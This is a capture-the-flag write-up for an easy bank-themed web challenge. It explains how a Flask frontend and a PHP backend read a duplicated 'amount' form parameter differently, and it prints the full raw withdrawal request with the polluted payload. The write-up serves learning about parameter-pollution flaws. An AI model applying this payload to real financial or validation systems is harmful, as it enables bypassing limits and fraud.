# Info
Difficulty: Easy
# Desc
> A notorious bank has recently opened its doors, claiming to house the wealth of the entire world. Can you reclaim what is rightfully yours? Here's a wizard's tip: the bank only permits withdrawals of 1337 units of currency at a time. Are you up for the challenge?

# Writeup
This is a parameter pollution challenge, we need to exploit the desync of two web server to bypass the restriction.

This is a bank application, we can register user, and then withdraw remaining balance.
If the user tries to withdraw negative number or number that is more than the remaining amount, frontend server will raise an error.
New users always have 0 balance, and there is no way to add balance.
After reading the code, I knew I needed to withdraw 1337 balance to get the flag.

The server is using Flask as frontend and PHP server as backend.
It checks the withdrawn value with `request.form.get("amount")`, and send raw body data, which is stored by  `request.get_data()`, to PHP backend.

I guessed there might be some kind of desync bugs here, so I tried to intercept the request and modify it to x-www-form-urlencoded format, and then add another "amount" parameter to see if Flask and PHP will get different value.
It turns out the answer is yes, here is the payload:

```
POST /api/withdraw HTTP/1.1
Host: 94.237.55.163:38700
Content-Length: 32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://94.237.55.163:38700
Referer: http://94.237.55.163:38700/home
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJleHAiOjE3MDgzNDI1MjF9.LBISXhPK-eIV2CFMxcuBQPs4BDcyA4PjKdwALSxnZV8
Connection: close

account=123&amount=0&amount=1337
```
Finally, I got the flag from "/home".